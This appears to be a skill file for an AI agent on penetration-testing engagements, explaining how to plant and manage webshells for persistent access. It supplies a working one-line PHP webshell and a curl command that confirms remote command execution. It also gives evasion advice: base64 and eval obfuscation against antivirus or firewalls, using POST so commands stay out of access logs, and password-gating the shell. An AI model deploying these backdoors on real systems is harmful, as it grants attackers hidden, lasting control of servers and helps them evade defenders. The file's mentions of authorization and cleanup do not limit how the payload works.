---
name: webshell-toolkit
description: Deploy and manage webshells on authorized hosts for persistent access during an engagement.
tags: [security, webshell, persistence, post-exploitation]
triggers: [webshell, persistence, backdoor, upload]
---

# Webshell toolkit

A webshell is a foothold you can return to. Keep it minimal, keep it hidden,
and remove it when the engagement ends.

## Deploy

1. **Find an upload path** — file upload forms, LFI-to-RCE, writable web dirs.
2. **Match the stack** — PHP, ASPX, JSP, or a polyglot when unsure.
3. **Minimal PHP shell**:
   ```php
   <?php system($_GET['c']); ?>
   ```
   Obfuscate if an AV or WAF is present: base64 the payload and `eval`.
4. **Confirm** with `curl 'https://<target>/shell.php?c=id'` via `http_request`.

## Manage

- Prefer a POST parameter over GET; GET lands in access logs and proxies.
- Password-gate it so a scanner cannot use it against you.
- Keep a table of shell URL → host → user → stack in the ledger.

## Clean up

Remove every webshell, uploaded tool and dropped binary when the engagement
ends. Leaving one behind is both a finding for the client and a liability for
you. Note each removal in the ledger.
